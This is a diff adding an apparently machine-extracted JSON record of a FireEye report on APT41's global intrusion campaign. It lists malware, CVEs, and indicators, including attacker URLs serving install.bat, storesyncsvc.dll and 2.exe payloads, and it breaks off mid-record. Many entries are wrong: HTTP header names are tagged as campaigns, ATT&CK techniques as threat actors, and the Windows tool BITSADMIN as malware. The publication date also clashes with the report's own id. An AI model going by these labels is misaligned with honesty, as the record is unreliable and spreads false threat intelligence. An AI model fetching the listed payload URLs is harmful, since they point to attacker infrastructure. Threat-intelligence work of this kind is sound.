@@ -1,0 +1,5854 @@
+{
+  "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+  "title": "This Is Not a Test: APT41 Initiates Global Intrusion Campaign Using Multiple Exploits",
+  "source": null,
+  "published_date": "January 20, 2020",
+  "report_metadata": {
+    "file_name": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020).pdf",
+    "file_path": "/root/APTtext/Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020).pdf",
+    "source_type": "pdf",
+    "char_length": 22803,
+    "report_profile": "narrative_cti"
+  },
+  "entities": [
+    {
+      "id": "ent_threatactor_APT41",
+      "type": "ThreatActor",
+      "name": "APT41",
+      "normalized_name": "APT41",
+      "aliases": [],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_1",
+        "ev_2",
+        "ev_39",
+        "ev_5"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_39",
+      "supporting_evidence_ids": [
+        "ev_1",
+        "ev_2",
+        "ev_5"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_malware_BEACON",
+      "type": "Malware",
+      "name": "BEACON",
+      "normalized_name": "BEACON",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_27",
+        "ev_28",
+        "ev_29",
+        "ev_31"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "family": "BEACON",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_27",
+      "supporting_evidence_ids": [
+        "ev_29",
+        "ev_28",
+        "ev_31"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_malware_BITSADMIN",
+      "type": "Malware",
+      "name": "BITSADMIN",
+      "normalized_name": "BITSADMIN",
+      "aliases": [
+        "BITSADMIN.EXE"
+      ],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_119",
+        "ev_121",
+        "ev_43"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_119",
+      "supporting_evidence_ids": [
+        "ev_121",
+        "ev_43"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "family_hints": [
+        "BITSADMIN",
+        "MULTISTAGE",
+        "DOWNLOADER",
+        "METHODOLOGY"
+      ],
+      "derived_from_file_id": "ent_file_BITSADMIN.EXE",
+      "family": "BITSADMIN",
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_malware_Storesyncsvc",
+      "type": "Malware",
+      "name": "Storesyncsvc",
+      "normalized_name": "Storesyncsvc",
+      "aliases": [
+        "storesyncsvc.dll"
+      ],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_21",
+        "ev_22",
+        "ev_81",
+        "ev_89"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_89",
+      "supporting_evidence_ids": [
+        "ev_81",
+        "ev_21",
+        "ev_22"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "family_hints": [
+        "BEACON"
+      ],
+      "derived_from_file_id": "ent_file_storesyncsvc.dll",
+      "family": "Storesyncsvc",
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_malware_VMProtected_Meterpreter",
+      "type": "Malware",
+      "name": "VMProtected Meterpreter",
+      "normalized_name": "VMProtected Meterpreter",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_29"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "family": "VMProtected Meterpreter",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_29",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_campaign_Accept-Encoding",
+      "type": "Campaign",
+      "name": "Accept-Encoding",
+      "normalized_name": "Accept-Encoding",
+      "aliases": [],
+      "confidence": 0.9,
+      "evidence_ids": [],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "llm",
+        "title_derive"
+      ],
+      "primary_evidence_id": null,
+      "supporting_evidence_ids": [],
+      "needs_review": true,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_campaign_Connection",
+      "type": "Campaign",
+      "name": "Connection",
+      "normalized_name": "Connection",
+      "aliases": [],
+      "confidence": 0.9,
+      "evidence_ids": [],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "llm",
+        "title_derive"
+      ],
+      "primary_evidence_id": null,
+      "supporting_evidence_ids": [],
+      "needs_review": true,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_campaign_Host",
+      "type": "Campaign",
+      "name": "Host",
+      "normalized_name": "Host",
+      "aliases": [],
+      "confidence": 0.9,
+      "evidence_ids": [],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "llm",
+        "title_derive"
+      ],
+      "primary_evidence_id": null,
+      "supporting_evidence_ids": [],
+      "needs_review": true,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_cve_CVE-2019-1652",
+      "type": "CVE",
+      "name": "CVE-2019-1652",
+      "normalized_name": "CVE-2019-1652",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_73"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_73",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_cve_CVE-2019-1653",
+      "type": "CVE",
+      "name": "CVE-2019-1653",
+      "normalized_name": "CVE-2019-1653",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_73"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_73",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_cve_CVE-2019-19781",
+      "type": "CVE",
+      "name": "CVE-2019-19781",
+      "normalized_name": "CVE-2019-19781",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_57",
+        "ev_58",
+        "ev_59",
+        "ev_67"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_57",
+      "supporting_evidence_ids": [
+        "ev_58",
+        "ev_67",
+        "ev_59"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_cve_CVE-2019-3396",
+      "type": "CVE",
+      "name": "CVE-2019-3396",
+      "normalized_name": "CVE-2019-3396",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_38"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_38",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_cve_CVE-2020-10189",
+      "type": "CVE",
+      "name": "CVE-2020-10189",
+      "normalized_name": "CVE-2020-10189",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_106",
+        "ev_77",
+        "ev_80",
+        "ev_81"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_77",
+      "supporting_evidence_ids": [
+        "ev_80",
+        "ev_81",
+        "ev_106"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_cve_CVE-2020-10198",
+      "type": "CVE",
+      "name": "CVE-2020-10198",
+      "normalized_name": "CVE-2020-10198",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_46",
+        "ev_47"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_46",
+      "supporting_evidence_ids": [
+        "ev_47"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_domain_github.com",
+      "type": "Domain",
+      "name": "github.com",
+      "normalized_name": "github.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_190",
+        "ev_191",
+        "ev_192"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "github.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_191",
+      "supporting_evidence_ids": [
+        "ev_190",
+        "ev_192"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_victim_telecommunications_organization",
+      "type": "Victim",
+      "name": "telecommunications organization",
+      "normalized_name": "telecommunications organization",
+      "aliases": [],
+      "confidence": 0.88,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "llm",
+        "title_derive"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    }
+  ],
+  "observations": [
+    {
+      "id": "ent_threatactor_Process_Injection",
+      "type": "ThreatActor",
+      "name": "Process Injection",
+      "normalized_name": "Process Injection",
+      "aliases": [],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_52"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_52",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_threatactor_Remote_File_Copy",
+      "type": "ThreatActor",
+      "name": "Remote File Copy",
+      "normalized_name": "Remote File Copy",
+      "aliases": [],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_52"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_52",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_threatactor_Scripting",
+      "type": "ThreatActor",
+      "name": "Scripting",
+      "normalized_name": "Scripting",
+      "aliases": [],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_51"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_51",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_threatactor_Standard_Application_Layer_Protocol",
+      "type": "ThreatActor",
+      "name": "Standard Application Layer Protocol",
+      "normalized_name": "Standard Application Layer Protocol",
+      "aliases": [],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_52"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_52",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_file_BITSADMIN.EXE",
+      "type": "File",
+      "name": "BITSADMIN.EXE",
+      "normalized_name": "BITSADMIN.EXE",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_119",
+        "ev_121",
+        "ev_43"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "file_name": "BITSADMIN.EXE",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_119",
+      "supporting_evidence_ids": [
+        "ev_121",
+        "ev_43"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "family_hints": [
+        "BITSADMIN",
+        "MULTISTAGE",
+        "DOWNLOADER",
+        "METHODOLOGY"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "conflict_demoted"
+    },
+    {
+      "id": "ent_tool_BITSADMIN.EXE",
+      "type": "Tool",
+      "name": "BITSADMIN.EXE",
+      "normalized_name": "BITSADMIN.EXE",
+      "aliases": [],
+      "confidence": 0.84,
+      "evidence_ids": [
+        "ev_119",
+        "ev_121",
+        "ev_43"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "alias_mention",
+      "alias_for": "ent_malware_BITSADMIN"
+    },
+    {
+      "id": "ent_malware_loader_X86_svchost",
+      "type": "Malware",
+      "name": "loader_X86_svchost",
+      "normalized_name": "loader_X86_svchost",
+      "aliases": [
+        "loader_X86_svchost.dll"
+      ],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_137"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_137",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "family_hints": [
+        "BEACON"
+      ],
+      "derived_from_file_id": "ent_file_loader_X86_svchost.dll",
+      "family": "loader_X86_svchost",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_malware_storesyncsvc.dll",
+      "type": "Malware",
+      "name": "storesyncsvc.dll",
+      "normalized_name": "storesyncsvc.dll",
+      "aliases": [],
+      "confidence": 0.84,
+      "evidence_ids": [
+        "ev_21",
+        "ev_22",
+        "ev_81"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "conflict_demoted",
+      "alias_for": "ent_malware_Storesyncsvc"
+    },
+    {
+      "id": "ent_malware_storesyncsvc.dll",
+      "type": "Malware",
+      "name": "storesyncsvc.dll",
+      "normalized_name": "storesyncsvc.dll",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_21",
+        "ev_22",
+        "ev_81",
+        "ev_89"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "file_name": "storesyncsvc.dll",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_89",
+      "supporting_evidence_ids": [
+        "ev_81",
+        "ev_21",
+        "ev_22"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "family_hints": [
+        "BEACON"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_tool_Cobalt_Strike",
+      "type": "Tool",
+      "name": "Cobalt Strike",
+      "normalized_name": "Cobalt Strike",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_27",
+        "ev_28",
+        "ev_29",
+        "ev_31"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_27",
+      "supporting_evidence_ids": [
+        "ev_29",
+        "ev_28",
+        "ev_31"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "tool_name": "Cobalt Strike",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_domain_cdn.bootcss.com",
+      "type": "Domain",
+      "name": "cdn.bootcss.com",
+      "normalized_name": "cdn.bootcss.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_183",
+        "ev_184",
+        "ev_185"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "cdn.bootcss.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_183",
+      "supporting_evidence_ids": [
+        "ev_184",
+        "ev_185"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "profile_demoted"
+    },
+    {
+      "id": "ent_domain_example.com",
+      "type": "Domain",
+      "name": "example.com",
+      "normalized_name": "example.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_186",
+        "ev_187",
+        "ev_188",
+        "ev_189"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "example.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_186",
+      "supporting_evidence_ids": [
+        "ev_188",
+        "ev_187",
+        "ev_189"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "profile_demoted"
+    },
+    {
+      "id": "ent_domain_exchange.dumb1.com",
+      "type": "Domain",
+      "name": "exchange.dumb1.com",
+      "normalized_name": "exchange.dumb1.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_27",
+        "ev_41",
+        "ev_98"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "exchange.dumb1.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_98",
+      "supporting_evidence_ids": [
+        "ev_27",
+        "ev_41"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "profile_demoted"
+    },
+    {
+      "id": "ent_domain_newbm.pl",
+      "type": "Domain",
+      "name": "newbm.pl",
+      "normalized_name": "newbm.pl",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_193",
+        "ev_194",
+        "ev_195",
+        "ev_196"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "newbm.pl",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_193",
+      "supporting_evidence_ids": [
+        "ev_195",
+        "ev_194",
+        "ev_196"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_ipv4_66.42.98.220",
+      "type": "IPv4",
+      "name": "66.42.98.220",
+      "normalized_name": "66.42.98.220",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_24",
+        "ev_40",
+        "ev_63",
+        "ev_76"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "66.42.98.220",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_76",
+      "supporting_evidence_ids": [
+        "ev_24",
+        "ev_40",
+        "ev_63"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_74.82.201.8",
+      "type": "IPv4",
+      "name": "74.82.201.8",
+      "normalized_name": "74.82.201.8",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_27",
+        "ev_41",
+        "ev_98"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "74.82.201.8",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_98",
+      "supporting_evidence_ids": [
+        "ev_27",
+        "ev_41"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_91.208.184.78",
+      "type": "IPv4",
+      "name": "91.208.184.78",
+      "normalized_name": "91.208.184.78",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_102",
+        "ev_103",
+        "ev_104",
+        "ev_78"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "91.208.184.78",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_104",
+      "supporting_evidence_ids": [
+        "ev_78",
+        "ev_102",
+        "ev_103"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_url_http_66.42.98.220_test_1.txt.",
+      "type": "URL",
+      "name": "http://66.42.98.220/test/1.txt.",
+      "normalized_name": "http://66.42.98.220/test/1.txt.",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_24",
+        "ev_40",
+        "ev_63",
+        "ev_76"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "http://66.42.98.220/test/1.txt.",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_76",
+      "supporting_evidence_ids": [
+        "ev_24",
+        "ev_40",
+        "ev_63"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "profile_demoted"
+    },
+    {
+      "id": "ent_url_http_66.42.98.220_12345_test_install.bat",
+      "type": "URL",
+      "name": "http://66.42.98.220:12345/test/install.bat",
+      "normalized_name": "http://66.42.98.220:12345/test/install.bat",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_84"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "http://66.42.98.220:12345/test/install.bat",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_84",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_url_http_66.42.98.220_12345_test_storesyncsvc.dll",
+      "type": "URL",
+      "name": "http://66.42.98.220:12345/test/storesyncsvc.dll",
+      "normalized_name": "http://66.42.98.220:12345/test/storesyncsvc.dll",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_84"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "http://66.42.98.220:12345/test/storesyncsvc.dll",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_84",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_url_http_91.208.184.78_2.exe",
+      "type": "URL",
+      "name": "http://91.208.184.78/2.exe",
+      "normalized_name": "http://91.208.184.78/2.exe",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_102",
+        "ev_103",
+        "ev_104",
+        "ev_78"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "http://91.208.184.78/2.exe",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_104",
+      "supporting_evidence_ids": [
+        "ev_103",
+        "ev_78",
+        "ev_102"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "profile_demoted"
+    },
+    {
+      "id": "ent_url_http_cdn.bootcss.com_",
+      "type": "URL",
+      "name": "http://cdn.bootcss.com/",
+      "normalized_name": "http://cdn.bootcss.com/",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_184",
+        "ev_185"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "http://cdn.bootcss.com/",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_184",
+      "supporting_evidence_ids": [
+        "ev_185"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "profile_demoted"
+    },
+    {
+      "id": "ent_url_http_example.com_title_",
+      "type": "URL",
+      "name": "http://example.com&title=",
+      "normalized_name": "http://example.com&title=",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_186",
+        "ev_187",
+        "ev_188",
+        "ev_189"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "http://example.com&title=",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_186",
+      "supporting_evidence_ids": [
+        "ev_188",
+        "ev_187",
+        "ev_189"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_url_http_example.com_title_redacted_desc_",
+      "type": "URL",
+      "name": "http://example.com&title=[redacted]&desc=[%",
+      "normalized_name": "http://example.com&title=[redacted]&desc=[%",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_186",
+        "ev_187",
+        "ev_189"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "http://example.com&title=[redacted]&desc=[%",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_186",
+      "supporting_evidence_ids": [
+        "ev_187",
+        "ev_189"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_url_https_github.com_libtom_libtomcrypt",
+      "type": "URL",
+      "name": "https://github.com/libtom/libtomcrypt",
+      "normalized_name": "https://github.com/libtom/libtomcrypt",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_190",
+        "ev_192"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "https://github.com/libtom/libtomcrypt",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_190",
+      "supporting_evidence_ids": [
+        "ev_192"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "profile_demoted"
+    },
+    {
+      "id": "ent_url_https_github.com_skywind3000_kcp",
+      "type": "URL",
+      "name": "https://github.com/skywind3000/kcp",
+      "normalized_name": "https://github.com/skywind3000/kcp",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_191"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
